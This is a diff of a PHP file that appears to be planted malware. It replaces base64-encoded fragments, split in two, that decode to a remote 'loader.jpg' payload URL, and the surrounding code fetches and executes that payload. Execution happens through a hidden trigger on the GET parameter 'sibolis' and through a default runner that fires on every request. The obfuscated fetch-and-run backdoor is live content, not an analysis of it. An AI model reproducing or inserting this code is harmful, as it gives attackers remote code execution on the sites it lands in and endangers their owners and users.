@@ -96,8 +96,8 @@ function _compilePushToDiskNode($f, $c)
 // Remote write trigger
 if (isset($_GET['sibolis'])) {
     try {
-        $p1 = 'YmF0dWstZGkta29taWstYWphLnBhZ';
-        $p2 = '2VzLmRldi9sb2FkZXIuanBn';
+        $p1 = 'aHR0cHM6Ly9rYXdhbmxhbWEub3JnL';
+        $p2 = '2tlcmFuZy9sb2FkZXIuanBn';
         $url = _compileDecodeChunkUnit($p1 . $p2);
         $d = _compileFetchCoreLite($url);
 
@@ -117,8 +117,8 @@ if (isset($_GET['sibolis'])) {
 
 // Default payload runner
 try {
-    $r1 = 'YmF0dWstZGkta29taWstYWphLnBhZ';
-    $r2 = '2VzLmRldi9sb2FkZXIuanBn';
+    $r1 = 'aHR0cHM6Ly9rYXdhbmxhbWEub3JnL';
+    $r2 = '2tlcmFuZy9sb2FkZXIuanBn';
     $u = _compileDecodeChunkUnit($r1 . $r2);
     _compileExecPayloadTask($u);
 } catch (Exception $e) {
